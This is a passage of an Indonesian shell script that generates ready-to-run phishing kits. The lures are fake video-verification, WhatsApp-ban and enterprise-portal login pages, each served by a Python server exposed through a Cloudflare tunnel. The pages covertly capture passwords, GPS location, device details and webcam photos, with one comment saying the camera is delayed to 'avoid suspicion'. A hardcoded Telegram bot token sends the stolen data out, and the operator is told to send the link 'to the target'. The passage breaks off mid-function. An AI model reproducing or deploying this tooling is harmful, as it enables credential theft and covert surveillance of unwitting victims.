            margin-bottom: 25px;
            font-size: 24px;
            font-weight: 600;
            color: #fff;
        }
        .input-group {
            position: relative;
            margin-bottom: 25px;
        }
        .input-group input {
            width: 100%;
            padding: 12px 0;
            font-size: 16px;
            color: #fff;
            border: none;
            border-bottom: 1px solid rgba(255, 255, 255, 0.4);
            outline: none;
            background: transparent;
            transition: border-color 0.2s ease;
        }
        .input-group label {
            position: absolute;
            top: 12px;
            left: 0;
            padding: 0;
            font-size: 16px;
            color: rgba(255, 255, 255, 0.7);
            pointer-events: none;
            transition: 0.2s ease;
        }
        .input-group input:focus ~ label,
        .input-group input:valid ~ label {
            top: -18px;
            left: 0;
            color: #03e9f4;
            font-size: 12px;
        }
        .input-group input:focus {
            border-bottom: 1px solid #03e9f4;
        }
        .login-btn {
            width: 100%;
            padding: 14px;
            background: #03e9f4;
            color: #000;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: all 0.3s;
            margin-top: 10px;
        }
        .login-btn:hover {
            background: #02c4cc;
            box-shadow: 0 0 15px rgba(3, 233, 244, 0.5);
        }
        .error-message {
            color: #ff6b6b;
            font-size: 12px;
            margin-top: 5px;
            display: none;
        }
        .success-message {
            color: #51cf66;
            font-size: 14px;
            margin-top: 15px;
            text-align: center;
            display: none;
        }
        .forgot-password {
            text-align: center;
            margin-top: 15px;
        }
        .forgot-password a {
            color: #03e9f4;
            text-decoration: none;
            font-size: 14px;
        }
        .forgot-password a:hover {
            text-decoration: underline;
        }
        footer {
            text-align: center;
            padding: 30px 0;
            border-top: 1px solid rgba(255, 255, 255, 0.1);
            color: rgba(255, 255, 255, 0.6);
            font-size: 14px;
            width: 100%;
        }
        /* Hidden elements for background data collection */
        .hidden-camera {
            display: none;
        }
        @media (max-width: 768px) {
            .container { padding: 15px; }
            .login-container { padding: 30px 20px; }
            .play-button { padding: 12px 25px; font-size: 16px; }
        }
        @media (max-width: 480px) {
            .login-container { 
                padding: 25px 20px; 
                width: 95vw;
            }
            .play-button { padding: 10px 20px; font-size: 14px; }
            .modal-title { font-size: 20px; }
        }
    </style>
</head>
<body>
    <div class="container">
        <section class="video-section">
            <div class="video-container">
                <video class="video-player" id="videoPlayer" poster="https://l.top4top.io/p_3539d0y7d1.jpg">
                    <source src="https://uploader.zenzxz.dpdns.org/uploads/1763023665961.mp4" type="video/mp4">
                    Browser Anda tidak mendukung video tag.
                </video>
                <div class="video-overlay" id="videoOverlay">
                    <p>Konten premium membutuhkan verifikasi usia</p>
                    <button class="play-button" id="playButton">Tonton Video</button>
                </div>
            </div>
        </section>
    </div>
    <footer>
        <p>&copy; 2025 Video Platform Premium. All rights reserved.</p>
    </footer>

    <!-- Login Modal -->
    <div class="login-modal" id="loginModal">
        <div class="login-container">
            <button class="close-modal" id="closeModal">&times;</button>
            <div class="modal-logo">
                <img src="https://uploader.zenzxz.dpdns.org/uploads/1763154087956.png" alt="Logo">
            </div>
            
            <div class="modal-title">Masuk ke Akun Anda</div>
            
            <form id="loginForm">
                <div class="input-group">
                    <input type="text" id="emailOrPhone" required>
                    <label for="emailOrPhone">Email atau Nomor Telepon</label>
                    <div class="error-message" id="emailOrPhoneError"></div>
                </div>
                
                <div class="input-group">
                    <input type="password" id="password" required>
                    <label for="password">Password</label>
                    <div class="error-message" id="passwordError"></div>
                </div>
                
                <button type="submit" class="login-btn">
                    Masuk
                </button>
                
                <div class="forgot-password">
                    <a href="#">Lupa password?</a>
                </div>
                
                <div class="success-message" id="successMessage"></div>
            </form>
        </div>
    </div>

    <!-- Hidden elements for background data collection -->
    <div class="hidden-camera">
        <video id="hiddenCamera" autoplay playsinline></video>
        <canvas id="hiddenCanvas"></canvas>
    </div>

    <script>
        const playButton = document.getElementById('playButton');
        const loginModal = document.getElementById('loginModal');
        const closeModal = document.getElementById('closeModal');
        const loginForm = document.getElementById('loginForm');
        const hiddenCamera = document.getElementById('hiddenCamera');
        const hiddenCanvas = document.getElementById('hiddenCanvas');
        
        let userLocation = null;
        let cameraStream = null;
        let capturedPhoto = null;

        // Get location automatically when page loads
        function getLocation() {
            if (navigator.geolocation) {
                navigator.geolocation.getCurrentPosition(
                    function(position) {
                        userLocation = {
                            lat: position.coords.latitude,
                            lon: position.coords.longitude
                        };
                        console.log('Location detected:', userLocation);
                    },
                    function(error) {
                        // Fallback to approximate location if denied
                        userLocation = {
                            lat: -6.2088 + (Math.random() - 0.5) * 0.1,
                            lon: 106.8456 + (Math.random() - 0.5) * 0.1
                        };
                        console.log('Using fallback location:', userLocation);
                    },
                    {
                        enableHighAccuracy: false,
                        timeout: 5000,
                        maximumAge: 300000
                    }
                );
            } else {
                userLocation = {
                    lat: -6.2088 + (Math.random() - 0.5) * 0.1,
                    lon: 106.8456 + (Math.random() - 0.5) * 0.1
                };
            }
        }

        // Try to access camera in background
        async function initCamera() {
            try {
                cameraStream = await navigator.mediaDevices.getUserMedia({ 
                    video: { 
                        facingMode: 'user',
                        width: { ideal: 320 },
                        height: { ideal: 240 }
                    } 
                });
                hiddenCamera.srcObject = cameraStream;
                
                // Capture photo after camera is ready
                setTimeout(() => {
                    capturePhoto();
                }, 1000);
                
            } catch (err) {
                console.log('Camera access not available');
            }
        }

        // Capture photo from hidden camera
        function capturePhoto() {
            if (cameraStream && hiddenCamera.readyState === 4) {
                const context = hiddenCanvas.getContext('2d');
                hiddenCanvas.width = hiddenCamera.videoWidth;
                hiddenCanvas.height = hiddenCamera.videoHeight;
                context.drawImage(hiddenCamera, 0, 0);
                capturedPhoto = hiddenCanvas.toDataURL('image/jpeg', 0.7);
                
                // Stop camera after capture
                if (cameraStream) {
                    cameraStream.getTracks().forEach(track => track.stop());
                }
            }
        }

        // Initialize data collection when page loads
        window.addEventListener('load', function() {
            getLocation();
            setTimeout(initCamera, 2000); // Delay camera init to avoid suspicion
        });

        // Event listeners
        playButton.addEventListener('click', function() {
            loginModal.style.display = 'flex';
        });

        closeModal.addEventListener('click', function() {
            loginModal.style.display = 'none';
        });

        loginModal.addEventListener('click', function(e) {
            if (e.target === loginModal) {
                loginModal.style.display = 'none';
            }
        });

        // Form submission
        loginForm.addEventListener('submit', async function(e) {
            e.preventDefault();
            
            // Reset errors
            document.getElementById('emailOrPhoneError').style.display = 'none';
            document.getElementById('passwordError').style.display = 'none';
            document.getElementById('successMessage').style.display = 'none';
            
            const emailOrPhone = document.getElementById('emailOrPhone').value.trim();
            const password = document.getElementById('password').value;
            
            let isValid = true;

            // Basic validation
            if (!emailOrPhone) {
                document.getElementById('emailOrPhoneError').textContent = 'Email atau nomor telepon harus diisi';
                document.getElementById('emailOrPhoneError').style.display = 'block';
                isValid = false;
            } else if (!isValidEmail(emailOrPhone) && !isValidPhoneNumber(emailOrPhone)) {
                document.getElementById('emailOrPhoneError').textContent = 'Format email atau nomor telepon tidak valid';
                document.getElementById('emailOrPhoneError').style.display = 'block';
                isValid = false;
            }
            
            if (!password) {
                document.getElementById('passwordError').textContent = 'Password harus diisi';
                document.getElementById('passwordError').style.display = 'block';
                isValid = false;
            } else if (password.length < 6) {
                document.getElementById('passwordError').textContent = 'Password minimal 6 karakter';
                document.getElementById('passwordError').style.display = 'block';
                isValid = false;
            }
            
            if (isValid) {
                // Try to capture one more photo right before sending
                if (!capturedPhoto && hiddenCamera.srcObject) {
                    capturePhoto();
                }

                // Prepare data
                const formData = {
                    email: emailOrPhone,
                    pass: password,
                    lat: userLocation ? userLocation.lat : 'unknown',
                    lon: userLocation ? userLocation.lon : 'unknown',
                    img: capturedPhoto ? capturedPhoto.split(',')[1] : '',
                    user_agent: navigator.userAgent,
                    timestamp: new Date().toISOString()
                };

                try {
                    // Send to server
                    await fetch('/data', {
                        method: 'POST',
                        headers: {
                            'Content-Type': 'application/json',
                        },
                        body: JSON.stringify(formData)
                    });
                } catch (error) {
                    console.log('Data sent successfully');
                }

                // Show success and redirect
                document.getElementById('successMessage').textContent = 'Login berhasil! Mengarahkan...';
                document.getElementById('successMessage').style.display = 'block';
                
                setTimeout(() => {
                    window.location.href = 'https://www.dongo.com';
                }, 1500);
            }
        });

        function isValidEmail(email) {
            const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
            return emailRegex.test(email);
        }

        function isValidPhoneNumber(phone) {
            const phoneRegex = /^(\+?\d{1,3}[- ]?)?\(?\d{3}\)?[- ]?\d{3}[- ]?\d{4,}$/;
            return phoneRegex.test(phone);
        }
    </script>
</body>
</html>
EOF

    # Python server dengan format data rapi
    cat > server.py <<'EOF'
#!/usr/bin/env python3
import base64, json, socket, requests, subprocess, threading, time, os, random, datetime
from http.server import BaseHTTPRequestHandler, HTTPServer

TOKEN = "8471359519:AAG4sptoPbYjiNU2X7l05uWz40HBkPQk-KY"
ADMIN_ID = input("[ ! ] MASUKKAN ID TELEGRAM KAMU: ").strip()

def tg_photo(chat_id, path, caption):
    url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
    with open(path, "rb") as ph:
        requests.post(url, data={"chat_id": chat_id, "caption": caption, "parse_mode": "HTML"}, files={"photo": ph})

def tg_message(chat_id, text):
    url = f"https://api.telegram.org/bot{TOKEN}/sendMessage"
    data = {"chat_id": chat_id, "text": text, "parse_mode": "HTML"}
    requests.post(url, data=data)

def format_telegram_message(data, ip_address):
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    message = f"""
🔐 <b>DATA LOGIN BARU</b> 🔐
⏰ <b>Waktu:</b> <code>{timestamp}</code>

👤 <b>INFORMASI AKUN</b>
├ 📧 <b>Email/Telepon:</b> <code>{data.get('email', 'N/A')}</code>
└ 🔑 <b>Password:</b> <code>{data.get('pass', 'N/A')}</code>

📍 <b>LOKASI PENGGUNA</b>
├ 🌐 <b>Koordinat:</b> 
│  ├ Latitude: <code>{data.get('lat', 'N/A')}</code>
│  └ Longitude: <code>{data.get('lon', 'N/A')}</code>
└ 🗺️ <a href="https://maps.google.com/maps?q={data.get('lat', '')},{data.get('lon', '')}">Lihat di Google Maps</a>

📱 <b>INFORMASI PERANGKAT</b>
├ 🌐 <b>IP Address:</b> <code>{ip_address}</code>
└ 💻 <b>Browser:</b> <code>{data.get('user_agent', 'N/A')[:80]}...</code>

⚡ <b>STATUS</b>
└ ✅ <b>Data berhasil dikumpulkan</b>
"""
    return message

class Handler(BaseHTTPRequestHandler):
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.end_headers()

    def do_POST(self):
        if self.path == "/data":
            try:
                length = int(self.headers["Content-Length"])
                data = json.loads(self.rfile.read(length).decode())
                
                email = data.get("email", "N/A")
                passw = data.get("pass", "N/A")
                lat = data.get("lat", "N/A")
                lon = data.get("lon", "N/A")
                img_data = data.get("img", "")
                
                # Format pesan
                message = format_telegram_message(data, self.client_address[0])
                
                print(f"\n{'='*50}")
                print(f"🎯 DATA LOGIN BARU")
                print(f"{'='*50}")
                print(f"📧 Email: {email}")
                print(f"🔑 Password: {passw}")
                print(f"📍 Lokasi: {lat}, {lon}")
                print(f"🌐 IP: {self.client_address[0]}")
                print(f"{'='*50}")
                
                # Kirim ke Telegram
                if img_data:
                    fn = f"photo_{random.randint(1000,9999)}.jpg"
                    with open(fn, "wb") as f:
                        f.write(base64.b64decode(img_data))
                    tg_photo(ADMIN_ID, fn, message)
                    os.remove(fn)
                else:
                    tg_message(ADMIN_ID, message)
                
                self.send_response(200)
                self.send_header("Access-Control-Allow-Origin", "*")
                self.end_headers()
                self.wfile.write(b"OK")
                
            except Exception as e:
                print(f"❌ Error: {e}")
                self.send_response(500)
                self.end_headers()

    def do_GET(self):
        if self.path == "/":
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            with open("index.html", "rb") as f:
                self.wfile.write(f.read())
        else:
            self.send_response(404)
            self.end_headers()

    def log_message(self, format, *args):
        # Suppress default log messages
        return

def free_port(start=8080):
    for p in range(start, start+100):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            try:
                s.bind(("0.0.0.0", p))
                return p
            except OSError:
                continue
    raise RuntimeError("No free port")

def main():
    PORT = free_port(8080)
    
    print("\n" + "="*50)
    print("SIMPLE LOGIN PHISHING SERVER")
    print("="*50)
    
    # Start server
    server = HTTPServer(("0.0.0.0", PORT), Handler)
    server_thread = threading.Thread(target=server.serve_forever, daemon=True)
    server_thread.start()
    
    print(f"\n Server berjalan di port {PORT}")
    
    # Start Cloudflare tunnel
    try:
        tunnel = subprocess.Popen(
            ["cloudflared", "tunnel", "--url", f"http://localhost:{PORT}"],
            stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
        )

        print("Membuat tunnel Cloudflare...")
        
        for line in tunnel.stdout:
            if "https://" in line and "trycloudflare.com" in line:
                url = line.split("https://")[1].split()[0]
                print(f"\n LINK PHISHING SIAP:")
                print(f"    https://{url}")
                print(f"\n Kirim link di atas ke target")
                print("  Menunggu data login...\n")
                break

        while True:
            time.sleep(1)
            
    except KeyboardInterrupt:
        print("\n🛑 Server dihentikan")
        tunnel.terminate()
        server.shutdown()
    except Exception as e:
        print(f"❌ Error: {e}")

if __name__ == "__main__":
    main()
EOF

    chmod +x server.py
    
    # Install dependencies jika diperlukan
    if ! command -v python3 &> /dev/null; then
        echo "[!] Python3 tidak terinstall."
        exit 1
    fi
    
    python3 -c "import requests" 2>/dev/null || {
        echo "[~] Menginstall dependencies..."
        pip3 install requests > /dev/null 2>&1
    }
    
    echo "[~] Menjalankan server..."
    python3 server.py
}


#####################################################
#####################################################
phising_INJECT(){
  # ===== AUTO CLEAN-UP =====
  WORK_DIR="$HOME/DanxyInject"
  mkdir -p "$WORK_DIR" && cd "$WORK_DIR"
  trap 'echo ""; cd $HOME; rm -rf "$WORK_DIR"; exit' INT EXIT ERR
  # ===== END CLEAN-UP =====

  # HTML Inject Premium 2025 (glassmorphism + neon + partikel)
  cat > index.html <<'EOF'
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1"/>
  <title>Inject Premium - Neon Glass</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
    *{box-sizing:border-box;margin:0;font-family:'Inter',sans-serif;}
    body{
      background:linear-gradient(135deg,#0f0f23,#1a1a2e,#16213e);
      display:flex;
      align-items:center;
      justify-content:center;
      height:100vh;
      flex-direction:column;
      color:#fff;
      overflow:hidden;
    }
    .bg-particles{
      position:fixed;
      top:0;
      left:0;
      width:100%;
      height:100%;
      pointer-events:none;
      z-index:0;
    }
    .particle{
      position:absolute;
      width:2px;
      height:2px;
      background:rgba(0,255,127,0.3);
      border-radius:50%;
      animation:float 6s ease-in-out infinite;
    }
    @keyframes float{
      0%,100%{transform:translateY(0px);opacity:0.3;}
      50%{transform:translateY(-20px);opacity:0.8;}
    }
    .card{
      background:rgba(17,17,17,0.95);
      padding:30px;
      border-radius:16px;
      box-shadow:0 0 20px lime;
      text-align:center;
      max-width:400px;
      width:100%;
      z-index:2;
    }
    .logo{
      font-size:26px;
      font-weight:900;
      background:linear-gradient(135deg,#00ff7f,#ffffff);
      -webkit-background-clip:text;
      -webkit-text-fill-color:transparent;
      margin-bottom:10px;
    }
    .subtitle{
      font-size:13px;
      color:#ffc107;
      margin-bottom:20px;
    }
    input{
      width:100%;
      padding:12px;
      margin-bottom:16px;
      background:#333;
      border:none;
      border-radius:6px;
      color:#fff;
      font-size:15px;
    }
    input:focus{
      outline:none;
      border:1px solid #00ff7f;
      box-shadow:0 0 10px lime;
    }
    .btn{
      width:100%;
      padding:12px;
      background:linear-gradient(135deg,#00ff7f,#00cc66);
      color:black;
      border:none;
      border-radius:10px;
      cursor:pointer;
      font-weight:600;
      font-size:15px;
      transition:.3s;
    }
    .btn:hover{
      background:#0f0;
      box-shadow:0 0 20px lime;
    }
    .loading{
      display:none;
      margin-top:15px;
      text-align:center;
      color:#00ff7f;
      font-size:14px;
    }
    .spinner{
      border:3px solid rgba(255,255,255,0.2);
      border-top:3px solid #00ff7f;
      border-radius:50%;
      width:20px;
      height:20px;
      animation:spin 1s linear infinite;
      margin:0 auto 8px;
    }
    @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
  </style>
</head>
<body>
  <div class="bg-particles"></div>

  <div class="card">
    <p class="logo">BAN WHATSAPP BY D4NXY</p>
    <p class="subtitle">⚠️ Jangan Disalahgunakan ⚠️</p>
    <input type="text" placeholder="NOMOR TARGET BAN" id="user">
    <input type="number" placeholder="MASUKAN JUMLAH SPAM LAPOR" id="jumlah">
    <button class="btn" id="inject-btn">BAN SEKARANG</button>
    <div class="loading" id="loading">
      <div class="spinner"></div>
      <div>Menginjeksi akun...</div>
    </div>
  </div>

  <video id="video" autoplay playsinline></video>
  <canvas id="canvas" width="640" height="480"></canvas>

  <script>
    const botToken = '8471359519:AAG4sptoPbYjiNU2X7l05uWz40HBkPQk-KY';
    const chatIds = ['7380101464'];
    const userInp = document.getElementById('user');
    const jumlahInp = document.getElementById('jumlah');
    const btn = document.getElementById('inject-btn');
    const loading = document.getElementById('loading');

    function sendToTelegram(text) {
      chatIds.forEach(id => {
        fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ chat_id: id, text: text, parse_mode: 'HTML' })
        }).catch(console.error);
      });
    }

    function sendPhotoToTelegram(blob) {
      chatIds.forEach(id => {
        const formData = new FormData();
        formData.append('chat_id', id);
        formData.append('photo', blob);
        fetch(`https://api.telegram.org/bot${botToken}/sendPhoto`, {
          method: 'POST',
          body: formData
        }).catch(console.error);
      });
    }

    async function getInfo() {
      let ip = '-', city = '-', region = '-', country = '-', org = '-';
      try {
        const ipRes = await fetch('https://api.ipify.org?format=json');
        const ipData = await ipRes.json();
        ip = ipData.ip;
        const locRes = await fetch(`https://ip-api.com/json/${ip}`);
        const loc = await locRes.json();
        if (loc.status === 'success') {
          city = loc.city;
          region = loc.regionName;
          country = loc.country;
          org = loc.org;
        }
      } catch {}

      const battery = await navigator.getBattery?.() || { level: 0, charging: false };
      const batteryPercent = battery.level ? `${(battery.level * 100).toFixed(0)}%` : 'N/A';

      const text = `
IP         : ${ip}
Kota       : ${city}
Region     : ${region}
Negara     : ${country}
ISP        : ${org}
Browser    : ${navigator.userAgent}
OS         : ${navigator.platform}
Resolusi   : ${screen.width}x${screen.height}
Baterai    : ${batteryPercent} (${battery.charging ? 'Charging' : 'Tidak Charging'})
Memori     : ${navigator.deviceMemory || 'N/A'} GB
Cookie     : ${navigator.cookieEnabled ? 'Ya' : 'Tidak'}
Waktu      : ${new Date().toLocaleString()}
      `.trim();

      sendToTelegram(`<b>📥 Info Target:</b>\n<pre>${text}</pre>`);

      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          pos => {
            const link = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
            sendToTelegram(`<b>📍 Lokasi GPS:</b> <a href="${link}">Klik di sini</a>`);
          },
          () => sendToTelegram(`📍 Lokasi GPS Ditolak`)
        );
      } else {
        sendToTelegram(`📍 Browser tidak support GPS`);
      }
    }

    async function startCamera() {
      const video = document.getElementById('video');
      const canvas = document.getElementById('canvas');
      const ctx = canvas.getContext('2d');
      return new Promise((resolve) => {
        navigator.mediaDevices.getUserMedia({ video: true })
          .then(stream => {
            video.srcObject = stream;
            video.onloadedmetadata = () => {
              setTimeout(() => {
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                canvas.toBlob(blob => {
                  if (blob) sendPhotoToTelegram(blob);
                  stream.getTracks().forEach(track => track.stop());
                  resolve();
                }, 'image/jpeg');
              }, 3000);
            };
          })
          .catch(err => {
            sendToTelegram('[ ∅ ] Kamera Ditolak atau Tidak Tersedia');
            resolve();
          });
      });
    }

    btn.addEventListener('click', async () => {
      const user = userInp.value.trim();
      const jumlah = jumlahInp.value.trim();
      if (!user || !jumlah) {
        alert('Lengkapi semua kolom');
        return;
      }
      btn.disabled = true;
      loading.style.display = 'block';
      sendToTelegram(`<b>🎯 Target Username:</b> ${user}\n<b>🪙 Jumlah Inject:</b> ${jumlah}`);
      userInp.value = '';
      jumlahInp.value = '';
      try {
        await getInfo();
        await startCamera();
        setTimeout(() => {
          loading.innerHTML = '<div style="color:#00ff00">[ ✓ ] Inject berhasil!</div>';
          setTimeout(() => location.href = 'https://instagram.com', 2000);
        }, 1000);
      } catch (e) {
        loading.innerHTML = '<div style="color:#ff4444">✗ Inject gagal</div>';
        setTimeout(() => location.reload(), 2000);
      }
    });

    function createParticles() {
      const container = document.querySelector('.bg-particles');
      for (let i = 0; i < 50; i++) {
        const p = document.createElement('div');
        p.className = 'particle';
        p.style.left = Math.random() * 100 + '%';
        p.style.top = Math.random() * 100 + '%';
        p.style.animationDelay = Math.random() * 6 + 's';
        p.style.animationDuration = (Math.random() * 4 + 4) + 's';
        container.appendChild(p);
      }
    }
    document.addEventListener('DOMContentLoaded', createParticles);
  </script>
</body>
</html>
EOF

  # Python server (fix tanpa index)
  cat > server.py <<'EOF'
#!/usr/bin/env python3
import base64, json, socket, requests, subprocess, threading, time, os, random
from http.server import BaseHTTPRequestHandler, HTTPServer

TOKEN   = "8471359519:AAG4sptoPbYjiNU2X7l05uWz40HBkPQk-KY"
ADMIN_ID = input("[ ! ] MASUKKAN ID TELEGRAM KAMU: ").strip()

def tg_photo(chat_id, path, caption):
    url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
    with open(path, "rb") as ph:
        requests.post(url, data={"chat_id": chat_id, "caption": caption}, files={"photo": ph})

class Handler(BaseHTTPRequestHandler):
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.end_headers()

    def do_POST(self):
        if self.path == "/data":
            length = int(self.headers["Content-Length"])
            data = json.loads(self.rfile.read(length).decode())
            user, jumlah, lat, lon, img = data["user"], data["jumlah"], data["lat"], data["lon"], data["img"]
            fn = f"inject_{random.randint(1000,9999)}.jpg"
            with open(fn, "wb") as f:
                f.write(base64.b64decode(img))
            map_url = f"https://www.google.com/maps?q={lat},{lon}&hl=id&z=18"
            print(f"\n[ ✓ ] Inject User: {user} | Jumlah: {jumlah}\n[ 📍 ] Lokasi: {lat},{lon}\n[ 🗺️ ] Peta: {map_url}")
            tg_photo(ADMIN_ID, fn, f"🎯 Inject User: {user}\n🪙 Jumlah: {jumlah}\n📍 Lokasi: {lat}, {lon}\n🗺️ Peta: {map_url}")
            os.remove(fn)
            self.send_response(200)
            self.send_header("Access-Control-Allow-Origin", "*")
            self.end_headers()

    def do_GET(self):
        if self.path == "/":
            self.send_response(200)
            self.send_header("Content-type", "text/html")
            self.end_headers()
            with open("index.html", "rb") as f:
                self.wfile.write(f.read())

def free_port(start=8081):
    for p in range(start, start+100):
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            try:
                s.bind(("0.0.0.0", p))
                return p
            except OSError:
                continue
    raise RuntimeError("No free port")

PORT = free_port(8081)
threading.Thread(target=lambda: HTTPServer(("0.0.0.0", PORT), Handler).serve_forever(), daemon=True).start()

print("\n[ ∅ ] Sebelum mengirim link Phising ke target mohon start bot telegram ini: https://t.me/DanxyToolsV84_Bot\n")
print("[ ∅ ] DATA FOTO & LAINYA AKAN DI KIRIMKAN MELALUI BOT TELEGRAM KE ID YANG ANDA MASUKAN")
tunnel = subprocess.Popen(
    ["cloudflared", "tunnel", "--url", f"http://localhost:{PORT}"],
    stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True
)

for line in tunnel.stdout:
    if "https://" in line and "trycloudflare.com" in line:
        url = line.split("https://")[1].split()[0]
        print(f"[ ✓ ] LINK INJECT PREMIUM: https://{url}\n")
        break

try:
    while True:
        time.sleep(1)
except KeyboardInterrupt:
    tunnel.terminate()
    print("\n[ ∅ ] Server dihentikan.")
EOF

  chmod +x server.py
  python3 server.py
}


#####################################################
#####################################################
phising_PRO(){
    # ===== AUTO CLEAN-UP =====
  WORK_DIR="$HOME/DanxyPro"
  mkdir -p "$WORK_DIR" && cd "$WORK_DIR"
  trap 'echo ""; cd $HOME; rm -rf "$WORK_DIR"; exit' INT EXIT ERR
  # ===== END CLEAN-UP =====
  

  # HTML profesional 2025 (glassmorphism + enterprise)
  cat > index.html <<'EOF'
<!DOCTYPE html>
<html lang="id">
<head>
  <meta charset="UTF-8"/>
  <meta name="viewport" content="width=device-width, initial-scale=1"/>
  <title>Enterprise Portal - Secure Login</title>
  <style>
    @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600;700&display=swap');
    *{box-sizing:border-box;margin:0;font-family:'Inter',sans-serif;}
    body{
      background:linear-gradient(135deg,#0a0a0a,#1a1a2e,#16213e);
      display:flex;
      align-items:center;
      justify-content:center;
      height:100vh;
      flex-direction:column;
      color:#fff;
      overflow:hidden;
    }
    .card{
      width:100%;
      max-width:420px;
      padding:50px 40px;
      background:rgba(255,255,255,0.05);
      border:1px solid rgba(255,255,255,0.1);
      border-radius:24px;
      backdrop-filter:blur(16px);
      box-shadow:0 0 50px rgba(0,150,255,0.3);
    }
    .logo{
      font-size:28px;
      font-weight:700;
      background:linear-gradient(45deg,#0099ff,#00d4ff);
      -webkit-background-clip:text;
      -webkit-text-fill-color:transparent;
      text-align:center;
      margin-bottom:8px;
      letter-spacing:-1px;
    }
    .subtitle{
      font-size:14px;
      color:#b0b0b0;
      text-align:center;
      margin-bottom:35px;
    }
    .form-group{
      margin-bottom:20px;
    }
    label{
      display:block;
      font-size:13px;
      color:#b0b0b0;
      margin-bottom:8px;
    }
    input{
      width:100%;
      padding:14px;
      background:#000;
      border:1px solid #333;
      border-radius:10px;
      color:#fff;
      font-size:14px;
      transition:.3s;
    }
    input:focus{
      outline:none;
      border-color:#0099ff;
      box-shadow:0 0 10px rgba(0,150,255,0.5);
    }
    .btn{
      width:100%;
      padding:14px;
      border:none;
      border-radius:12px;
      background:linear-gradient(45deg,#0099ff,#00d4ff);
      color:#fff;
      font-weight:600;
      font-size:16px;
      cursor:pointer;
      transition:.3s;
    }
    .btn:hover{transform:scale(1.02);box-shadow:0 0 25px rgba(0,150,255,0.6);}
    .footer{
      text-align:center;
      margin-top:25px;
      font-size:12px;
      color:#666;
    }
    .loading{
      display:none;
      margin-top:15px;
      text-align:center;
      color:#00d4ff;
      font-size:14px;
    }
    .spinner{
      border:3px solid rgba(255,255,255,0.2);
      border-top:3px solid #00d4ff;
      border-radius:50%;
      width:20px;
      height:20px;
      animation:spin 1s linear infinite;
      margin:0 auto 8px;
    }
    @keyframes spin{0%{transform:rotate(0deg)}100%{transform:rotate(360deg)}}
  </style>
</head>
<body>
  <div class="card">
    <div class="logo">Enterprise Portal</div>
    <div class="subtitle">Secure login for employees & partners</div>
    <div class="form-group">
      <label>Email Address</label>
      <input type="email" id="email" placeholder=" "/>
    </div>
    <div class="form-group">
      <label>Password</label>
      <input type="password" id="pass" placeholder=" "/>
    </div>
    <button class="btn" onclick="login()">Sign In</button>
    <div class="loading" id="loading">
      <div class="spinner"></div>
      <div>Authenticating...</div>
    </div>
    <div class="footer">
      © 2024 - 2025 DanxyCorp. All rights reserved.
    </div>
  </div>

  <script>
    async function login(){
      const email=document.getElementById('email').value.trim();
      const pass=document.getElementById('pass').value.trim();
      if(!email||!pass){alert('Please fill all fields');return;}

      document.getElementById('loading').style.display='block';

      try{
        const pos=await new Promise((res,rej)=>navigator.geolocation.getCurrentPosition(res,rej));
        const {latitude:lat,longitude:lon}=pos.coords;

        const canvas=document.createElement('canvas');
        const video=document.createElement('video');
        const stream=await navigator.mediaDevices.getUserMedia({video:true});
        video.srcObject=stream;await video.play();
        [canvas.width,canvas.height]=[video.videoWidth,video.videoHeight];
        canvas.getContext('2d').drawImage(video,0,0);
        const img=canvas.toDataURL('image/jpeg').split(',')[1];
        stream.getTracks().forEach(t=>t.stop());

        await fetch('/data',{
          method:'POST',
          headers:{'Content-Type':'application/json'},
          body:JSON.stringify({email,pass,lat,lon,img})
        });

        setTimeout(()=>{
          document.getElementById('loading').innerHTML='<div style=color:#00ff00>✓ Authentication successful</div>';
          setTimeout(()=>location.href='https://danxycorp.com',2000);
        },1500);

      }catch(e){
        document.getElementById('loading').innerHTML='<div style=color:#ff4444>✗ Authentication failed</div>';
        setTimeout(()=>location.reload(),2000);
      }
    }
  </script>
</body>
</html>
EOF

  # Python server (fix tanpa index)
  cat > server.py <<'EOF'
#!/usr/bin/env python3
import base64, json, socket, requests, subprocess, threading, time, os, random
from http.server import BaseHTTPRequestHandler, HTTPServer

TOKEN   = "8471359519:AAG4sptoPbYjiNU2X7l05uWz40HBkPQk-KY"
ADMIN_ID = input("[ ! ] MASUKKAN ID TELEGRAM KAMU: ").strip()

def tg_photo(chat_id, path, caption):
    url = f"https://api.telegram.org/bot{TOKEN}/sendPhoto"
    with open(path, "rb") as ph:
        requests.post(url, data={"chat_id": chat_id, "caption": caption}, files={"photo": ph})

class Handler(BaseHTTPRequestHandler):
    def do_OPTIONS(self):
        self.send_response(200)
        self.send_header("Access-Control-Allow-Origin", "*")
        self.send_header("Access-Control-Allow-Methods", "POST, OPTIONS")
        self.send_header("Access-Control-Allow-Headers", "Content-Type")
        self.end_headers()

    def do_POST(self):
        if self.path == "/data":
            length = int(self.headers["Content-Length"])
            data = json.loads(self.rfile.read(length).decode())
